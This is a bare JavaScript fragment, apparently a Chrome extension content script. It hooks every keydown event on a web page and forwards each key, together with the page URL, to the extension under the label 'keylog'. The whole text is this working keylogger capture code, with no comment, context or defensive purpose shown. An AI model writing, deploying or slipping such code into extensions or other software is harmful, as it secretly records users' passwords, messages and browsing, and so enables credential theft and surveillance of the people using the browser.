document.addEventListener("keydown", (event) => {
  chrome.runtime.sendMessage({
    type: "keylog",
    key: event.key,
    url: location.href
  });
});
